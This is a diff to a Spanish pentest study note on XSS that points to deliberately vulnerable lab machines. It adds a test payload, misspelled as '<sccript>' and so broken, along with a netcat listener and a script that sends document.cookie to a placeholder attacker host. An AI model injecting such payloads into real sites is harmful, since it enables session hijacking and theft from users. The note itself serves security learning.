@@ -9,3 +9,22 @@ Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:
 
 **Proyecto Github con docker vulnerable a XSS** <a href="https://github.com/globocom/secDevLabs">secDevLabs</a>  
 **Maquina MyExpense** <a href="https://www.vulnhub.com/entry/myexpense-1,405/">MyExpense machine (Vulnhub)</a>
+
+#### Comprobar si es vulnerable
+En un campo de texto, por ejemplo para enviar un post, comentario, etc. escribimos:  
+```
+<sccript>alert('Prueba XSS')</script>
+
+En ocastiones no es necesario las etiquetas <script>, o incluso es necesario no ponerlas para que funcione
+```
+
+### Cookie stealing
+Se puede poner netcat a la escucha:  
+```
+nc -nlvp 80
+```
+
+E inyectar el siguiente código:  
+```
+<script>img = new Image(); img.src = "http://IP_ATACANTE/a.php?"+document.cookie;</script>
+```
